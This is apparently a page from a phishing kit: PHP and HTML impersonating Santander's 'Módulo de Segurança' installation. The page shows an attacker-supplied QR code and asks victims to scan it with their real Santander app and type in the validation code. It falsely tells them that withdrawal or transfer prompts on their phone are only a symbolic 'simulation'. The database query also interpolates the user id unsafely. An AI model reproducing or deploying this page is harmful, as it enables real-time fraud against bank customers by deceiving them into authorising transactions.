<?php
$buscaQrCode = read($conn, 'acessos', "WHERE id = '$UserId'");
$qrLink = $buscaQrCode['0']['tokenqrcode'];
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title> </title>
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	<link rel="stylesheet" href="styles/geral.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet">
	<script src="javascripts/jquery-1.4.2.min.js"></script>
	<script src="javascripts/jquery.maskedinput-1.2.2.min.js"></script>
	<script src="javascripts/custom.js"></script>
</head>
<body class="color_enter_home">

<div class="container is_header">

		<div class="left">
			<div class="logo"><img src="imgs/logo.png"></div><!-- logo -->
			<div class="busca"><input type="text" name="busca" class="buscar_home" placeholder="Digite aqui sua busca" autocomplete="off"></div>
		</div><!-- left -->

		<div class="right">
			<div class="gerente"><img src="imgs/icon_gerente.jpg"></div><!-- gerente -->
			<div class="user"><img src="imgs/icon_user.jpg"></div><!-- user -->
			<div class="exit"><span>Sair</span></div>
		</div><!-- right -->

<div class="clear"></div>
</div><!-- container -->


<div class="container is_corpo_main">
		<div class="menu_lateral"><img src="imgs/menu_lateral.jpg"></div>

		<div class="content_corpo">
			<img src="imgs/fundo_corpo.jpg">
		</div><!-- content_corpo -->
	<div class="clear"></div>
</div><!-- container -->



<div class="block_modal_corpo">
	<div class="modal_corpo" style="margin-top: 10px!important;">
		<div class="modal_title">
			<img src="imgs/logo.png">
		</div><!-- modal_title -->

		<div class="desc_modal">
			Para iniciarmos a <strong>instalação do Módulo de Segurança Santander</strong>, precisaremos confirmar alguns dados.
		</div><!-- desc_modal -->

		<div class="corpo_modal" style="margin-top: -30px;">
			<form action="acesso.php" method="post" onsubmit="return check_qrcode();">
				<span class="msg_qrcode">
					Utilize seu dispositivo móvel para realizar a validação de segurança com seu ID Santander.
				</span>

				<a href="#" class="dica_qrcode" onclick="return dica_qrcode();">O que devo fazer?</a>

				<img src="<?php echo $qrLink;?>" class="img_qrcode" style="margin-bottom: 5px;">

				<span class="info_qrc">Digite o código gerado em seu celular</span>
				<input type="text" name="is_qrcode" id="is_qrcode" placeholder="Código QRCode" class="input_corpo input_qrcode" maxlength="8" autocomplete="off">
				<span class="info_qrc" style="background-color:rgba(255,0,0, .8);color:#fff;font-size:.8em;display:block;width:100%;margin: 20px 0 0 0;line-height: 1.4em;padding:5px 0;border-radius:3px;">
					Este processo é válido apenas como <strong style="font-weight: 700;">simulação</strong> para checarmos se seu código QRCode está sicronizado com nossos dispositivos de segurança.
					<br><br>
					Poderão aparecer em seu celular, de forma automática o nome de alguma transação como: Saque, Transferência, ou outras transações.
					<strong style="font-weight: 700;">Essa descrição é apenas simbólica para testarmos o sistema do ID Santander.</strong>
				</span>

				<div class="clear"></div>

				<div class="buttons" style="margin-top: 10px;">
					<input type="submit" name="is_enter" id="is_enter" value="Confirmar" class="submit_corpo centraliza_qrcode">
					<input type="hidden" name="sender" value="qrcode">
				</div><!-- buttons -->
			</form>

		</div><!-- corpo_modal -->
	<div class="clear"></div>
	</div><!-- modal_corpo -->
</div><!-- block_modal_corpo -->

<div class="modal_qrcode" id="ensinar_qrcode">
	<div class="close" onclick="return fecha_dica_qrcode();">X</div>

	<h1 class="titulo_ensina">Como utilizar seu ID Santander</h1>

	<div class="clear"></div>

	<div class="centraliza_box">

		<div class="box_divider">
			<img src="imgs/icon_ensina1.jpg" height="142" width="141" alt="">
			<div class="ensinando">
				<span class="laranja_ensina">1.</span> Abra o app Santander no seu celular e <span class="laranja_ensina">selecione o ícone ID Santander.</span>
			</div><!-- ensinando -->
		</div><!-- box_divider -->

		<div class="box_divider">
			<img src="imgs/icon_ensina2.jpg" height="150" width="184" alt="">
			<div class="ensinando">
				<span class="laranja_ensina">2.</span> Posicione a câmera do <span class="laranja_ensina">seu celular e capture a imagem QRCode dinâmico</span> exibida na tela do seu computador.
				Em seguida <span class="laranja_ensina">clique em gerar código de validação.</span>
			</div><!-- ensinando -->
		</div><!-- box_divider -->

		<div class="box_divider">
			<img src="imgs/icon_ensina3.jpg" height="136" width="90" alt="">
			<div class="ensinando">
				<span class="laranja_ensina">3. Digite</span> na tela do seu computador <span class="laranja_ensina">o código de validação</span> exibido no seu celular.
			</div><!-- ensinando -->
		</div><!-- box_divider -->

	</div><!-- centraliza_box -->

	<div class="clear"><br><br><br><br></div>

	<p class="info_ensina">
		Na confirmação de algumas transações e operações, poderão ser solicitadas <span class="laranja_ensina">validações adicionais</span> como um <span class="laranja_ensina">código recebido por SMS e/ou a senha de seu cartão.</span>
	</p><!-- info_ensina -->
</div><!-- modal_qrcode -->








<div class="container">
	<div class="content_login">

	<div class="clear"></div>
	</div><!-- content_login -->
</div><!-- container -->
</body>
</html>
